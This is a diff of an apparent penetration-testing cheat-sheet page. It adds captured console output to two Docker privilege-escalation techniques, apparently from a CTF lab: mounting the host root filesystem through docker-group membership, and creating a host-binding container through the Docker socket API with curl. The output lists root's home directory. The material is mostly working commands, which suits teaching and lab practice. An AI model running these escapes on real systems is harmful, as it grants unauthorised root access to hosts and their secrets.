@@ -352,20 +352,53 @@ body.dark-mode #dynamicFormContainer button:hover {
 <h3 id="abuse-1-docker-group">Abuse #1: Docker group</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> List images
 </span></span><span class="line"><span class="cl"><span class="go">docker images
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> docker images
+</span></span><span class="line"><span class="cl"><span class="go">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+</span></span></span><span class="line"><span class="cl"><span class="go">alpine       latest    d7d3d98c851f   2 years ago   5.53MB
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Mount host root filesystem
-</span></span><span class="line"><span class="cl"><span class="go">docker run -v /:/mnt -it &lt;IMAGE_NAME&gt; bash
+</span></span><span class="line"><span class="cl"><span class="go">docker run -v /:/mnt -it &lt;IMAGE_ID&gt; sh
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> docker run -v /:/mnt -it d7d3d98c851f sh  
+</span></span><span class="line"><span class="cl"><span class="go">/ # 
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
 </span></span><span class="line"><span class="cl"><span class="go">ls /mnt/root
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/ # ls /mnt/root
+</span></span></span><span class="line"><span class="cl"><span class="go">root.txt
 </span></span></span></code></pre></div><hr>
 <h3 id="abuse-2-docker-api">Abuse #2: Docker API</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show running containers
 </span></span><span class="line"><span class="cl"><span class="go">curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@2d24bf61767c:/root# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
+</span></span></span><span class="line"><span class="cl"><span class="go">[{&#34;Containers&#34;:-1,&#34;Created&#34;:1590787186,&#34;Id&#34;:&#34;sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e&#34;,&#34;Labels&#34;:null,&#34;ParentId&#34;:&#34;&#34;,&#34;RepoDigests&#34;:null,&#34;RepoTags&#34;:[&#34;sandbox:latest&#34;],&#34;SharedSize&#34;:-1,&#34;Size&#34;:5574537,&#34;VirtualSize&#34;:5574537},{&#34;Containers&#34;:-1,&#34;Created&#34;:1588544489,&#34;Id&#34;:&#34;sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9&#34;,&#34;Labels&#34;:null,&#34;ParentId&#34;:&#34;&#34;,&#34;RepoDigests&#34;:[&#34;&lt;none&gt;@&lt;none&gt;&#34;],&#34;RepoTags&#34;:[&#34;&lt;none&gt;:&lt;none&gt;&#34;],&#34;SharedSize&#34;:-1,&#34;Size&#34;:1056679100,&#34;VirtualSize&#34;:1056679100}]
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create container
 </span></span><span class="line"><span class="cl"><span class="go">curl -s -X POST -H &#39;Content-Type: application/json&#39; --data-binary &#39;{&#34;Image&#34;: &#34;&lt;IMAGE_NAME&gt;:latest&#34;,&#34;HostConfig&#34;: {&#34;Binds&#34;: [&#34;/:/r&#34;]}, &#34;Cmd&#34;: [&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;ls -la /r/root/&#34;], &#34;Tty&#34;: true}&#39; --unix-socket /var/run/docker.sock http://localhost/containers/create
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">(remote) root@2d24bf61767c:/root# curl -s -X POST -H &#39;Content-Type: application/json&#39; --data-binary &#39;{&#34;Image&#34;: &#34;sandbox:latest&#34;,&#34;HostConfig&#34;: {&#34;Binds&#34;: [&#34;/:/r&#34;]}, &#34;Cmd&#34;: [&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;ls -la /r/root/&#34;], &#34;Tty&#34;: true}&#39; --unix-socket /var/run/docker.sock http://localhost/containers/create
+</span></span></span><span class="line"><span class="cl"><span class="go">{&#34;Id&#34;:&#34;ec28a9d1ae931fb81ac1c2640d1aac24bf1e7172bd6c42f02400659c299157cd&#34;,&#34;Warnings&#34;:[]}
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start container
-</span></span><span class="line"><span class="cl"><span class="go">curl -s -X POST -H &#39;Content-Type: application/json&#39; --unix-socket /var/run/docker.sock http://localhost/containers/&lt;CONTAINER_ID&gt;/start
+</span></span><span class="line"><span class="cl"><span class="go">curl -i -X POST -H &#39;Content-Type: application/json&#39; --unix-socket /var/run/docker.sock http://localhost/containers/&lt;CONTAINER_ID&gt;/start
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">(remote) root@2d24bf61767c:/root# curl -i -X POST -H &#39;Content-Type: application/json&#39; --unix-socket /var/run/docker.sock http://localhost/containers/9115/start
+</span></span></span><span class="line"><span class="cl"><span class="go">HTTP/1.1 204 No Content
+</span></span></span><span class="line"><span class="cl"><span class="go">Api-Version: 1.40
+</span></span></span><span class="line"><span class="cl"><span class="go">Docker-Experimental: false
+</span></span></span><span class="line"><span class="cl"><span class="go">Ostype: linux
+</span></span></span><span class="line"><span class="cl"><span class="go">Server: Docker/19.03.8 (linux)
+</span></span></span><span class="line"><span class="cl"><span class="go">Date: Mon, 23 Sep 2024 04:29:11 GMT
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show results
 </span></span><span class="line"><span class="cl"><span class="go">curl -s --unix-socket /var/run/docker.sock &#34;http://localhost/containers/&lt;CONTAINER_ID&gt;/logs?stderr=1&amp;stdout=1&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">(remote) root@2d24bf61767c:/root# curl -s --unix-socket /var/run/docker.sock &#34;http://localhost/containers/9115/logs?stderr=1&amp;stdout=1&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">total 56
+</span></span></span><span class="line"><span class="cl"><span class="go">drwx------    6 root     root          4096 Sep 23 04:06 .
+</span></span></span><span class="line"><span class="cl"><span class="go">drwxr-xr-x   20 root     root          4096 Feb  9  2021 ..
+</span></span></span><span class="line"><span class="cl"><span class="go">lrwxrwxrwx    1 root     root             9 Jun 17  2020 .bash_history -&gt; /dev/null
+</span></span></span><span class="line"><span class="cl"><span class="go">-rw-r--r--    1 root     root          3106 Dec  5  2019 .bashrc
+</span></span></span><span class="line"><span class="cl"><span class="go">drwx------    2 root     root          4096 Jun 30  2020 .cache
+</span></span></span><span class="line"><span class="cl"><span class="go">drwxr-xr-x    3 root     root          4096 Jun 30  2020 .local
+</span></span></span><span class="line"><span class="cl"><span class="go">-rw-r--r--    1 root     root           161 Dec  5  2019 .profile
+</span></span></span><span class="line"><span class="cl"><span class="go">-rw-r--r--    1 root     root            75 Jun 30  2020 .selected_editor
+</span></span></span><span class="line"><span class="cl"><span class="go">drwx------    2 root     root          4096 Jun 30  2020 .ssh
+</span></span></span><span class="line"><span class="cl"><span class="go">-rw-------    1 root     root         12235 Aug 26  2020 .viminfo
+</span></span></span><span class="line"><span class="cl"><span class="go">-rw-r--r--    1 root     root           165 Jun 30  2020 .wget-hsts
+</span></span></span><span class="line"><span class="cl"><span class="go">-rw-------    1 root     root            33 Sep 23 04:06 root.txt
+</span></span></span><span class="line"><span class="cl"><span class="go">drwxr-xr-x    3 root     root          4096 May 18  2020 snap
 </span></span></span></code></pre></div>
 </div></div>
     
